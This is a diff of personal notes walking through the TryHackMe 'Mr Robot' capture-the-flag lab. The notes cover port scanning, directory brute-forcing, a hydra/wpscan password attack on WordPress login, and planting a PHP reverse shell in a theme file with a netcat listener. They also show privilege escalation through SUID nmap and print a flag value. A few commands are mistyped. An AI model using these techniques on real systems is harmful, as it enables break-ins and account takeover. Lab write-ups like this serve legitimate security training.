@@ -1,6 +1,7 @@
-All steps and concepts about CTF made on https://tryhackme.com/room/mrrobot
+All steps and concepts about CTF Mr Robot https://tryhackme.com/room/mrrobot
 
 1 - Start Machine on tryhackme 
+
 2 - Connect on VPN (download configuration file and connect via terminal)
 
     sudo openvpn lfsain.ovpn
@@ -11,49 +12,52 @@ All steps and concepts about CTF made on https://tryhackme.com/room/mrrobot
 
     sudo nmap -sS 10.10.94.232 | tee nmap-ss.txt (-sS quick scan , tee to save on txt file)
 
-    returned: 
+    returned:
 
     22/tcp  closed ssh
     80/tcp  open   http
     443/tcp open   https
 
-4 - So, it returned that are a service HTTP running at 80 , if open the browser with ip adress, it'll show a web page animation of Mr Robot
+4 - So, the return of before step, there is a service HTTP running at 80 port
+    If open the browser with ip adress, it'll show a web page animation of Mr Robot
 
-5 - It's talked about Directories of Web Application
+5 - It's talked about Directories of Web Application on video class
 
 6 - 'Dirb' is used to map all the know Directories tha can exists and are common
+    
     On /usr/share/wordlists/dirb/
 
     dirb http://10.10.94.232/ -o dirb.txt (-o save output on file)
 
-
-7 - There are a robots.txt, so , if it is open on browser will return some folder to dont be avoid, like:
+7 - There is the file http://10.10.94.232/robots.txt, so , if you open on browser will return some folders to be avoid by Google crawlers, like:
 
     User-agent: *
     fsocity.dic
     key-1-of-3.txt
 
-    So, there are one, saying to dont open the 'key-1-of-3.txt'
+    So, there is one, saying to dont open the 'key-1-of-3.txt'
 
     If you access on browser like http://10.10.94.232/key-1-of-3.txt
 
-    It return the firt flag of CTF
+    It return the firt flag of CTF, just paste it on tryhackme
 
 8 - The fsocity.dic is a wordlist with many words. So we'll download it
 
     wget http://10.10.94.232/fsocity.dic
 
-9 - The fsocity.dic it's so long and have many words. It has many reapts words. To get it cleared, we need run 
+9 - The fsocity.dic has many repeated words. To get it cleared, we need run 
 
     sort fsocity.dic | uniq > unicos.txt
 
 9 - NOTE: It's a Wordpress running, because on path /feed return on dirb
 
-10 - Attack Brutal Force in the wp-login form . It's talked too about 'Burp Suite'. 
+10 - 'Attack Brutal Force' on wp-login form . 
+
+    It's talked too about 'Burp Suite' on video class
     
     The 'Burp Suite' analises how work the connection between your machine and target.
 
-    We need it to know how the login form works and url , param's etc
+    We need it to know how the login form works and url, param's etc
 
     We'll use the 'hydra' to automaze the process
 
@@ -63,18 +67,70 @@ All steps and concepts about CTF made on https://tryhackme.com/room/mrrobot
 
     The firt user found is 'elliot'
 
-11 - With the user, will force the password with hydra, with same unicos.txt
+11 - With the user, we will force the password with hydra, with same unicos.txt file
 
     hydra -l elliot -p unicos.txt 10.10.94.232 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.94.232%2Fwp-admin%2F&testcookie=1:Invalid username" -F -V
 
-    or with 'wpscan': (diferrence is tha wpscan is focused on wordpress Attack bruteforce)
+    or with 'wpscan': (diferrence is thar wpscan is focused on wordpress 'Attack brute force')
 
     wpscan --url 10.10.6.242 --passwords unicos.txt --usernames elliot
 
     password found 'ER28-0652'
-     
 
-12 - Stopped 43:23
+12 - On Kali linux there are some prepered shell in many languages, 
 
-ip 10.10.6.242
+    Like we are with Wordpress, we'll use php. 
+    
+    They are on /usr/share/webshells/php
 
+13 - Get the content of shell 'cat php-reverse-shell.php'
+
+14 - 44:53 Inject this script on admin page of wordpress, by copy and paste, change only the variable of connection database with the ip host and port.
+
+    You can edit in - Appearence > Editor > archive.php  
+
+    The port used to connect on database was 1337 
+
+    It need be open on Kali connection with netcat, and listen it on this port
+
+    nc -lp 1337 -vv
+
+15 - Save the edition you was doing on admin page
+
+16 - Access this file (you edited) on webbrowser http://10.10.24.68/wp-content/themes/twentyfifteen/archive.php 
+
+17 - It'll open the ssh connection to be runned like user 'default' (Didn't undestand how was made this ssh connection)
+
+    Maybe by ' tune connection ' opened by script executed
+
+18 - Execute python with 'spawn shell' hack
+
+    python - c 'import pty: pty.spawn("/bin/sh")'
+
+19 - Change the current user to 'robot' user , 'su robot' password was 'abcd.....wxyz'
+
+20 - On ~/ folder of machine has the seconde key-2-of-3.txt
+
+    822c73956184f694993bede3eb39f959
+
+21 - The next step is upgrade access level to the user logged robot - 'escalate privilege on linux'
+    
+    Search for executables that can do it for us
+
+    find / -user root -perm -4000 2>/dev/null
+
+22 - gtfobins.github.io can show examples of 'escalate privilege'
+
+23 - nmap is a hint for step 3
+
+24 - With gtfobins, seach for nmap, we see this command:
+
+    nmap --interactive
+    
+    !sh
+
+    whoami
+
+    I'll be the root user
+
+25 - On /root folder there is the file key-3-of-3.txt, just cat it 
